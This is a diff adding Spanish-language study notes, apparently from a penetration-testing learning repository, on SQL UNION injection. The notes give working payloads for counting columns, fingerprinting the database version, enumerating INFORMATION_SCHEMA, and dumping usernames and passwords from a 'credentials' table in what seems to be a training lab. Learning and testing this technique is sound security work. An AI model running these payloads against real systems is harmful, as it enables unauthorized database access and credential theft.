@@ -654,4 +654,123 @@ UNION SELECT username, 2, 3, 4 from passwords-- '
 
 # UNION INJECTION
 
+Ahora que sabemos como usar la clausula "Union" vamos a aprender a hacer injecciones con ella.
+
+## DETECTAR NUMERO DE COLUMNAS
+
+Antes de explotar estas consultas, nosotros necesitaremos busacr el numero de columnas que tiene el servidor seleccionadas. Hay dos formas:
+
+- Usando "ORDER BY"
+- Usando "UNION"
+
+### USANDO ORDER BY
+
+La primera forma de detectar el número de columnas, nosotros tneemos una injección y especificamos "column 1, column 2, " etc nos dara un error diciendo que la columna expecifica no existe.
+
+Por ejemplo, nosotrosp odemos empezar poninedo "order by 1" y entonces "order by2" asi hasta que nos de error. en el momento que falle sabemos que no hay mas.
+
+```
+' order by 1-- -
+```
+```
+' order by 5-- -
+```
+
+![image](https://github.com/D4l1-web/PenetrationTester-Ruta/assets/79869523/df99c151-85a7-4da6-bc5b-8a425f208831)
+
+## USAR UNION
+
+Otro metodo por si no nos da los resultados que queremos, el primer metodo de los resultados sera injectar 3 columnas.
+```
+cn' UNION select 1,2,3-- -
+cn' UNION select 1,2,3,4-- -
+```
+
+![image](https://github.com/D4l1-web/PenetrationTester-Ruta/assets/79869523/51ec1177-5610-409e-823d-968656ea77b8)
+
+## LOCALIZACION DE INJECCION
+
+Mientras nos devuelven multiples columnas, la aplicacion web solo diplayea eso, si queremos injectar una consulta en una columna y que no printee en la pagina. Necesitaremos determinadas columnas.
+
+Es muy común que no cada columna te la enseñe.
+
+Podemos usar ##version par aver la version de SQL.
+
+```
+cn' UNION select 1,@@version,3,4-- -
+```
+
+# ENUMERACIÓN EN LA BASE DE DATOS
+
+## HUELLAS MYSQL
+
+Antes de enumerar la base de datos necesitaremos identifical el tipo de DMBS.
+
+Si el servidor web usa HTTp respuestas es Apache o Nhins, es buenos aber esto en Linux. Si no es IIS en Windows con MSSQL, sin embargo podemos utilziar diferentes consultas
+
+![image](https://github.com/D4l1-web/PenetrationTester-Ruta/assets/79869523/1402b783-7966-42cb-bd60-a34b3365f858)
+
+### ESQUEMA DE INFORMACION DE BASE D DATOS
+
+Los datos que nos da la tabla usando "UNION SELECT" necesitaremos hacer consultas con "SELECT"
+
+- Listar bases de datos
+- Listar tables con la base de datos
+- Listar columnas con la tabla
+
+Con la información podemos hacer un select en cualquier base de dato y utilziar "INFORMTAION_SCHEMA"
+
+Contiene los metadatos sobre la base de datos y las tablas de servidor. Es un rol crucial mientas explotas Injecciones SQL.
+
+```
+SELECT * FROM my_database.users;
+```
+
+## ESQUEMA
+
+Para empezar una enumearcion en un DBMS en "INFORMATION_SCHEMA" contiene la información de todas las basesd e datos del servidor, bamos a hacer un test.
+
+```
+SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
+```
+
+vemos un "ilfreight" y "dev" bases de datos.
+
+```
+cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
+```
+![image](https://github.com/D4l1-web/PenetrationTester-Ruta/assets/79869523/4f78f3ce-fe9a-4707-8e91-3606f530d64b)
+
+Vemos las dos bases y podemos buscar información sobre la aplicación y podemos utilziar "SELECT Database()"
+```
+cn' UNION select 1,database(),2,3-- -
+```
+
+## TABLAS
+
+Antes de dumpear los datos de la base de datos "dev" nosotros necesitamos una lista de las tablas con la consulta "SELECT" para buscar todas las tablas con la base de datos.
+
+Las tablas contienen la informacion sobre la base de datos
+
+```
+cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
+```
+
+## COLUMNAS
+
+Para credenciales por ejemplo
+
+```
+cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
+```
+
+## DATOS
+
+Ahora que tnemos toda la información podemos sacar el usuario y contraseña.
+```
+cn' UNION select 1, username, password, 4 from dev.credentials--
+```
+![image](https://github.com/D4l1-web/PenetrationTester-Ruta/assets/79869523/0d7fdb38-9813-4a53-a9e9-4eea3a753e78)
+
+
 
